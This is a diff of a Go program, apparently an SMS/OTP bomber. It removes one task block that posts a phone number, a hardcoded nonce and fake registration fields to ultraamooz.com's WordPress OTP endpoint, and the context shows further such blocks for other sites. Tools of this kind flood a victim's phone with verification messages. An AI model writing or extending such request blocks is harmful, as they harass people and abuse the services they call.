@@ -541,38 +541,6 @@ tasks <- func(c *http.Client) func() {
 }(client)
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-// --- ultraamooz.com (POST, FORM) ---
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        formData := url.Values{}
-        formData.Set("action", "digits_check_mob")
-        formData.Set("countrycode", "+98")
-        formData.Set("mobileNo", formatPhoneWithSpaces(phone))
-        formData.Set("csrf", "a6fd7f4d05") // ممکنه نیاز به آپدیت داشته باشه
-        formData.Set("login", "2")
-        formData.Set("username", "monsmain")
-        formData.Set("email", "")
-        formData.Set("captcha", "")
-        formData.Set("captcha_ses", "")
-        formData.Set("digits", "1")
-        formData.Set("json", "1")
-        formData.Set("whatsapp", "0")
-        formData.Set("digits_reg_name", "monsmain")
-        formData.Set("digits_reg_username", "monsmain")
-        formData.Set("digregcode", "+98")
-        formData.Set("digits_reg_mail", formatPhoneWithSpaces(phone))
-        formData.Set("digregscode2", "+98")
-        formData.Set("mobmail2", "")
-        formData.Set("digits_reg_password", "")
-        formData.Set("dig_otp", "")
-        formData.Set("code", "")
-        formData.Set("dig_reg_mail", "")
-        formData.Set("dig_nounce", "a6fd7f4d05")
-        sendFormRequest(c, ctx, "https://ultraamooz.com/wp-admin/admin-ajax.php", formData, &wg, ch)
-    }
-}(client)
-
 // --- www.1001kharid.com (POST, FORM) ---
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
